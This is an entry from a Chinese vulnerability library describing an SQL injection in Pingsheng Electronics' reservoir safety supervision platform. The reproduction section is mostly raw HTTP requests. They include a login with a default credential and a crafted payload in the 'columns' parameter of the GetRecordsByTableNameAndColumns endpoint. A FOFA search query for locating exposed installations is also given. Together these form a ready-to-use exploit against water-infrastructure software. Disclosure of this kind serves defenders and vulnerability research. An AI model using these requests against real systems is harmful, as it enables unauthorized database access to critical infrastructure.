---
fofa: "body="
source: "wy876 漏洞文库"
---

# 平升电子水库安全监管平台GetRecordsByTableNameAndColumns存在SQL注入漏洞

# 一、漏洞简介
唐山平升电子技术开发有限公司于1999年成立，位于唐山市国家高新技术开发区，是河北省高科技企业，是国内最早生产GPRS数据传输模块的企业之一，专注水行业远程测控设备和系统软件的专业制造商。公司自成立以来，始终致力于供水、水资源远程测控新技术、新产品的开发生产，其中GPRS数据传输模块应用到青藏铁路、大庆油田、曹妃甸工业区等许多国家重点工程和大型企业；水源井远程测控终端通过了国家权威机构的检验、获得国家专利、批量应用到浙江、山西、山东、辽宁、江苏、河南、河北、内蒙、陕西、北京、天津、唐山等许多地区的水务部门，成为行业中的名牌产品。平升电子水库安全监管平台GetRecordsByTableNameAndColumns存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限 。

# 二、影响版本
+ 平升电子水库安全监管平台

# 三、资产测绘
+ fofa`body="js/PSExtend.js"`
+ 特征


# 四、漏洞复现
首先获取Guid

```plain
POST /Webservices/UserAdminService.asmx/Login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close

LoginName=Data86&LoginPwd=Data86%40
```


替换获取的Guid发送数据包

```plain
POST /WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 105
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Connection: close

loginIdentifer=07deec48-6ee8-4127-9b27-fda9ae2036f9&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pq90gr1d4fdx1r82>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
